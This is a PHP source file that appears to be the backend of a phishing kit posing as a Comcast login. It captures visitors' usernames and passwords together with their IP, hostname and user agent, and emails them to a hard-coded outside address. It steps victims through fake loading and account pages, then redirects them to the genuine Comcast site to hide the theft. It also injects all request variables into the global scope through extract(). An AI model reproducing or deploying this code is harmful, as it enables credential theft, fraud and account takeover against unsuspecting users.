<?php
if (!ini_get('register_globals')) {
$superglobals = array($_SERVER, $_ENV,
$_FILES, $_COOKIE, $_POST, $_GET);
if (isset($_SESSION)) {
array_unshift($superglobals, $_SESSION);
}
foreach ($superglobals as $superglobal) {
extract($superglobal, EXTR_SKIP);
}
ini_set('register_globals', true);
}

$ip = $_SERVER["REMOTE_ADDR"];
$hostname = gethostbyaddr($ip);
$user_agent = $_SERVER["HTTP_USER_AGENT"];

if (!empty($_SERVER['HTTP_CLIENT_IP']))
{
$oip=$_SERVER['HTTP_CLIENT_IP'];
}
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
{
$oip=$_SERVER['HTTP_X_FORWARDED_FOR'];
}
else
{
$oip="same";
}

$admin_mail = "eldridge_robin@mail.com";

// LOADING 1
if ($page == "second") {
$user = $_POST["$user"];
include("Account.php");
die();
}

// ACCOUNT
if ($page == "third") {
$uz = $_POST["$uz"];
include("Loading2.php");
die();
}

// LOADING 2
if ($page == "forth") {
$uzc = $_POST["$uzc"];
include("Done.php");
die();
}

// DONE
if ($page == "final") {
$uzd = $_POST["$uzd"];
setcookie("logged_in","SESSID89127387123ASDKJH23872HXC89LASKLASD89", time()+3600*24*30);
header('Location: http://ad.doubleclick.net/ddm/clk/288545052;114648096;n?https://customer.comcast.com/Overview/');
die;
}

if($page == "first") {
$subject="$user / $passwd";
$mailbody="############################\nUser: $user\nPass: $passwd\n==\nIP: $ip\nHostName: $hostname\nOriginal IP: $oip\nUser-Agent: $user_agent\n############################";
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/plain; charset=iso-8859-1' . "\r\n";
$headers .= 'From: <none@example.com>' . "\r\n";
mail($admin_mail, $subject, $mailbody, $headers);
include("Loading1.php");
}
if (!$page) {
include("Login.php");
die();
}
$user = $_POST["$user"];
$passwd = $_POST["$passwd"];
?>